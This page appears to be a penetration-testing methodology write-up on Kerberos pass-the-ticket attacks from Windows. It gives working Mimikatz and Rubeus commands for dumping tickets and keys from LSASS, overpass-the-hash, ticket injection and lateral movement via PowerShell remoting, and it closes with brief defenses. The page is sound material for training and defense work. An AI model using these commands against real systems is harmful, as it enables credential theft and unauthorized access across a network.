---
layout: page
title: "Pass the Ticket from Windows"
subtitle: "Exporting Kerberos tickets from LSASS, forging them from keys and injecting them into new sessions"
permalink: /methodology/lateral-movement/pass-the-ticket-windows/
---

Pass the ticket reuses a Kerberos ticket instead of a hash. A TGT lets its holder request service tickets (TGS) without the password, and a TGS lets its holder use one service. On Windows, LSASS keeps tickets in memory, so a local administrator can export every ticket on the host. This page covers exporting tickets, forging new ones from keys (overpass the hash), and injecting a ticket into a session for lateral movement.

## 1. Understand the ticket types

1. The **ticket-granting ticket (TGT)** is the first ticket issued. It lets the holder ask the KDC for more tickets.
2. The **ticket-granting service (TGS)** ticket is requested for one service and lets the holder use it.

A standard user can export only their own tickets. A local administrator can export all of them.

## 2. Export tickets

Mimikatz exports tickets as `.kirbi` files, one per ticket, into the current directory.

```powershell
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
```

Rubeus prints the tickets as base64 instead, which is convenient for copying between hosts.

```cmd
Rubeus.exe dump /nowrap
```

Exported file names follow a pattern: a random value, then the account name, then the service and domain, for example `[random]-USERNAME@krbtgt-DOMAIN.kirbi`. Names ending in `$` belong to a computer account, and that account needs a ticket to interact with Active Directory.

## 3. Dump keys for overpass the hash

Forging a TGT needs the account's Kerberos keys, not only its NTLM hash. Mimikatz lists them per logon session.

```powershell
mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
```

Look for the `aes256_hmac` and `rc4_hmac` entries. Both can be used to request a TGT.

## 4. Overpass the hash

Mimikatz converts a key into a TGT. The notes show this step as the `sekurlsa::pth` module without a `/run` argument.

```text
mimikatz # sekurlsa::pth /domain:DOMAIN /user:USERNAME /ntlm:NTLM_HASH
```

Rubeus does the same with `asktgt`. With `/ptt` the ticket is injected into the current session immediately. The notes say Rubeus does not require administrator rights for this step, whereas Mimikatz does.

```cmd
Rubeus.exe asktgt /domain:DOMAIN /user:USERNAME /aes256:AES256_KEY /nowrap
Rubeus.exe asktgt /domain:DOMAIN /user:USERNAME /rc4:NTLM_HASH /ptt
```

## 5. Inject a ticket

Rubeus can inject a `.kirbi` file, or a base64 blob that you convert from a file first.

```cmd
Rubeus.exe ptt /ticket:KIRBI_FILE
Rubeus.exe ptt /ticket:TICKET_B64
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("KIRBI_FILE"))
```

Mimikatz injects a file with `kerberos::ptt`. The `misc::cmd` option opens a command prompt directly, avoiding the exit-and-reopen step.

```text
mimikatz # kerberos::ptt "KIRBI_FILE"
mimikatz # misc::cmd
```

## 6. Move laterally with PowerShell remoting

PowerShell remoting listens on TCP 5985 (HTTP) or 5986 (HTTPS). The account must be an administrator on the target or a member of the Remote Management Users group.

```powershell
Enter-PSSession -ComputerName DC_HOST
```

To keep the current logon session's TGT intact, create a sacrificial process with Rubeus and inject the ticket there. The `/show` flag displays the window, which is hidden by default.

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:USERNAME /domain:DOMAIN /aes256:AES256_KEY /ptt
```

The notes compare this with `runas /netonly`, which has the same effect of separating the new ticket from the existing one.

## What to look for

- The ticket service: `krbtgt/` means a TGT, which can request further tickets. Any other service means a TGS for one service.
- The start and end time. The example in the notes has a 10-hour lifetime and a 7-day renewal window.
- Computer account tickets ending in `$`, which can be used for machine-level actions.
- Whether the target accepts remoting: an administrator, or membership in Remote Management Users.

## Pitfalls

- Exporting other users' tickets needs local administrator rights, and Mimikatz needs debug privilege.
- Injecting into the current session can replace the TGT already held there. Use the sacrificial process when you need both identities.
- A ticket is valid only for its lifetime. Re-request or import a fresh one when it expires.
- Exported files contain live credentials. Store them in a controlled location and delete them after use.

## Defense

The notes do not list defenses for this technique. The following follow from its requirements:

- Limit local administrator rights, since they are needed to export every user's tickets from LSASS.
- Restrict membership of Remote Management Users and the rights needed for remoting, so an unexpected ticket cannot open a session.
- Review which accounts are allowed to log on to sensitive hosts, and keep administrators off workstations they do not manage.
